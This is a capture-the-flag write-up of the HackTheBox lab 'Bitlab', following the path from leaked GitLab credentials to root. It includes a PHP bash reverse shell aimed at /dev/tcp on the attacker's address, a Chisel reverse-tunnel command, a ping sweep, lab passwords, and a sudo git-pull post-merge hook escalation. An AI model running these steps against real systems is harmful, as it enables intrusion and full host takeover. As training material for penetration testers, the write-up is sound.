---
title: HTB-Bitlab
draft: false
tags:
  - htb
  - linux
  - gitlab
  - psql
  - postgresql
  - git
  - pull
  - ollydbg
  - reversing
  - ping-sweep
  - tunneling
  - chisel
  - medium
---

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/Bitlab.png)

**Bitlab** was a pretty hard box which included reversing .exe file and abusing sudoers file. 

I first gained access to Gitlab login credential through deobfuscating javascript. From there, I injected php RCE script to profile page's index.php file which spawned me shell as www-data. From here, I reverse engineered RemoteConnection.exe file to obtain credentials for the root. There was another way of privilege escalation to root, which was to create copy of the .git directories and make a git pull which includes a payload that will spawn a reverse shell as the root. 

## Information Gathering
### Rustscan

Rustscan discovers SSH and HTTP open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/bitlab]
└─$ rustscan --addresses 10.10.10.114 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.41s latency).
Scanned at 2024-04-23 01:17:08 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
```

### Nmap

Nmap finds nothing interesting:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/bitlab]
└─$ sudo nmap -sVC -p 22,80 10.10.10.114   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 02:01 EDT
Nmap scan report for 10.10.10.114
Host is up (0.41s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
80/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.29 seconds
```

## Enumeration
### HTTP - TCP 80

10.10.10.114 redirects me to `http://10.10.10.114/users/sign_in`, which seems to be a GitLab Sign-in page:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image.png)

Feroxbuster finds bunch of new valid paths.

I can map them with Burp Suite as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-8.png)



Feroxbuster finds two valid users as well: `/root` & `/clave`


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-1.png)


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-2.png)

## Login Bypass

Going to `/help/bookmarks.html`, there are several Bookmarks:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-3.png)

**Gitlab Login** leads me to weird url encoding:

```js
javascript:(function(){
        var _0x4b18=["\x76\x61\x6C\x75\x65",
                    "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E",
                    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
                    "\x63\x6C\x61\x76\x65",
                    "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64",
                    "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"
                    ];
        document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
```

I will bookmark **Gitlab Login** as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-4.png)

Returning to sign-in page, credentials auto-fills:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-5.png)

By intercepting the request with Burp Suite, I can see the password in plain text: **11des0081x**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-6.png)

With the found credentials, I can successfully sign-in:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-7.png)

I see two projects listed: **Profile** and **Deployer**. I would have to look in to this later. 

## Shell as www-data

Going to `/dashboard/snippets`, shows **postgresql** snippet:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-9.png)

It reveals the credentials for PostgreSQL -> **profiles:profiles**

`/snippets/1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-10.png)

### Index.php Reverse Shell

Now let's move back and check on Project Profiles:

`/root/profile`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-11.png)


It seems like **index.php** is for the user description as such:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-12.png)

I will try adding php script to see if it work:

`<?php echo system(‘whoami’); ?>`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-13.png)

Without any restriction, I can merge the change to master branch:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-14.png)

After merging, `/profile` shows the executed command:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-15.png)

I would be able to get a reverse shell connection using the php script below:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/1337 0>&1'");
?>
```

After merging the change, I get a shell connection as www-data

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-19.png)


## Priesc: www-data to clave


After making the shell more interactive using `python2 -c 'import pty; pty.spawn("/bin/bash")'`, I ran lse.sh to see if it finds anything.

I can run `git pull` with the root privilege, this is something interesting:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-21.png)

Uncommon SUID mount.cifs is found but this doesn't seem very intriguing to me:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-20.png)

### git pull privesc

[This source](https://github.com/arnav-t/git-pull-priv-escalation/blob/master/README.md) shows a way on how to abuse git pull sudoer privilege:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-22.png)

In order to exploit this, I need write privilege on `.git/hooks` but www-data doesn't have this privilege:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-23.png)

If www-data has a privilege to create file inside `.git/hooks`, I can create such payload inside of it and run `git pull` to run commands as the root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-24.png)

Since www-data doesn't have enough privilege to exploit this, I will move from here for now.

- *I thought this was not exploitable, but later from other's write-ups I realized it is actually exploitable -> More at the below*
### Ping Sweep & Port Scan

From some enumeration, I realized that this server is running with docker. 

Let's see if there are any other network connected to this server:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-25.png)

It seems that **172.19.0.1** is also connected.

I will use ping sweep to see what host are actually open:

`time for i in $(seq 1 254); do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-26.png)

Ping sweep finds 5 hosts alive.

Since nmap is installed on the host, I will use it for port scanning:

`nmap 172.19.0.2-5`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-30.png)

.2 and .3 could be running Gitlab and postgres host is .5.

### Tunneling

Running `netstat -ntlp`, I see local box is also listening on port 5432, which probally means this forwards to postgres container at .5:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-31.png)

**psql** command is not installed on the local box so I would have to port forward it to my local Kali machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-32.png)

#### Chisel

After transferring Chisel to the target box, I will start the client session towards Kali's Chisel server so I can access port 5432 on my local kali machine:

`./chisel_linux client 10.10.14.21:9000 R:5432:localhost:5432`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-33.png)

On my Kali Chisel server, I have a connection made:

`chisel server -p 9000 --reverse`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-34.png)

Now with the credentials found from Postgresql snippet earlier, I can access port 5432 through from Kali machine:

`psql -h 127.0.0.1 -p 5432 -U profiles`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-35.png)

### PSQL

Through `\l`, I will list all the DBs available. **gitlab** and **profiles** looks interesting to me:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-36.png)

I can connect to DB **gitlab** through `\c gitlab`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-37.png)

Listing tables with `\dt`, I see  a bunch:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-38.png)

Among all of them, **users** table looks interesting to me:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-39.png)

I can list columns inside of it through `\d users` and it has columns of encrypted password an username:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-40.png)

However it seems like I don't have permission to read these:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-41.png)

I will move the DB connection to **profiles**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-42.png)

There seems to be only one table in there:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-43.png)

It shows password for user clave: **c3NoLXN0cjBuZy1wQHNz==**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-44.png)

Using the found credential, I can sign-in to SSH as clave:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-46.png)

## Privesc: clave to root

There are two ways for privescalation to root.

- lower-user (clave,www-data) to root: Abusing sudoers
- Clave to root: Reversing RemoteConnection.exe



### RemoteConnection.exe

On Clave's home directory, I see **RemoteConnection.exe** file which is quite odd since this machine is a Linux machine:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-47.png)

I will copy the .exe over to my local Kali machine through **scp**:

`scp clave@10.10.10.114:~/RemoteConnection.exe .`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-48.png)

#### ollydbg

I will first install **ollydbg** through `apt install ollydbg`.

After opening **RemoteConnection.exe** file, I will right click it and Search for all referenced text strings:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/butlab2.png)


Here you’ll see a bunch of strings, one of which contains the username clave and the Access Denied msg.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-56.png)

Click on the Access Denied string and press F2 to set a breakpoint. This is where the program will halt if you F9 and allow it to run continuously.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-57.png)



Restart the program in the debugger. Now press F9 once to run the program. It will halt exactly where you placed the breakpoint. Once there, in the stack pane at the bottom right we see this:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-58.png)

This appears to be the root password. After some testing I found that the password actually is for root:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-59.png)

### Git Pull

Second way of privesc to root is through abusing sudoers file.

Remember earlier that I mentioned abusing sudoers won't be possible since I don't have permission to create files inside `.git/hooks`? Well, I was wrong. There's a way to bypass this:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-21.png)

In `git`, a `pull` is actually a `git fetch` followed by a `git merge`. I can make my own hook, a `post-merge` hook, and put a shell in there.

I could create a new project, but to do a `git pull`, I’ll need to connect it to a remote project. I could stand up my own git server on my kali box.

A much easier way to do this is to just copy one of the projects. I’ll copy it into a working directory in `/tmp`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-49.png)

I’ll write a reverse shell as a `post-merge` hook, and set it executable:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-51.png)

Running git pull won't work currently since there's nothing to merge:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-53.png)

I made slight change in **index.php** so that there's something to merge:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-54.png)

Now I can pull it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-55.png)

Reverse shell as root is spawned on my local listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-60.png)


## References
- https://github.com/arnav-t/git-pull-priv-escalation/blob/master/README.md
- https://sckull.github.io/posts/bitlab
- https://ivanitlearning.wordpress.com/2020/10/22/hackthebox-bitlab/